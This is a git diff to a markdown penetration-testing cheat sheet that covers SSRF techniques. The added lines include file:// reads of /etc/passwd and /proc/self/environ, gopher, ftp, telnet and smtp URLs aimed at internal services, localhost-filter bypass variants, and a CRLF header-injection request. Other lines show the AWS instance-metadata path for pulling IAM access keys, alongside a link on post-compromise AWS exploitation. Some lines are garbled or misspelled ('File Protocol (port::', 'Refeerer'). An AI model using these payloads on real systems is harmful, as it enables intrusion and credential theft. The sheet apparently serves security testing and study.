@@ -56,7 +56,7 @@ List of /etc/{blah} files (in case some strings are blacklisted e.g. "/etc/passw
 **Nslookup**
 ```
 Reverse DNS query:
-nslookup [ hostname/ip ]
+$ nslookup [ hostname/ip ]
 ```
 
 **Nmap**  
@@ -299,7 +299,7 @@ SSRF indicators:
 * Look for params that may reference internal services.
 * Look for a search input box / any form input that may reference internal services.
 
-File Protocol:
+File Protocol (port::
 ```
 file:///etc/passwd
 file:///proc/self/cmdline
@@ -308,10 +308,12 @@ file:///proc/self/environ
 curl file:///etc/passwd
 ```
 
-Gopher Protocol:
+Other Protocols
 ```
 gopher://127.0.0.1:3306/_<PAYLOAD>      // MySQL
-add more
+ftp://127.0.0.1:20/21
+telnet://127.0.0.1:23
+smtp://127.0.0.1:25
 ```
 
 Elastic Search APIs (default port:9200/9300):
@@ -333,6 +335,29 @@ fsockopen()
 curl_exec()
 ```
 
+Bypass 'localhost' filters:
+```
+http://{localhost_variation}
+127.0.0.1
+192.168.1.1
+Localhost
+lOcAlHoSt
+0
+```
+
+CLRF injection in HTTP header:
+```
+Carriage Return (\r) or Line Feed (\n) terminates a line of HTTP request.
+
+// Attacker's request:
+GET ?url=http://example.com/%0d%0aRefeerer:localhost
+Host:www.target.com
+
+// Server's request
+GET http://example.com
+Referer:localhost
+```
+
 ---
 ### Amazon Web Services SSRF
 ---
@@ -347,7 +372,7 @@ http://169.254.169.254/latest/user-data
 ```
 2. Find AWS Access Keys.
 ```
-http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/iam/security-credentials/{EC2_instance_role}
 
 Info retrieved should contain:
     * AccessKeyId: { access key ID }
@@ -380,6 +405,7 @@ LFD => $ /docker-entrypoint.sh /init.sh ~/.aws/credentials.json
 ```
 
 More info on AWS testing: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AWS%20Amazon%20Bucket%20S3
+More info on exploiting AWS post-compromise: https://danielgrzelak.com/exploring-an-aws-account-after-pwning-it-ff629c2aae39
 
 ---
 ### REST APIs
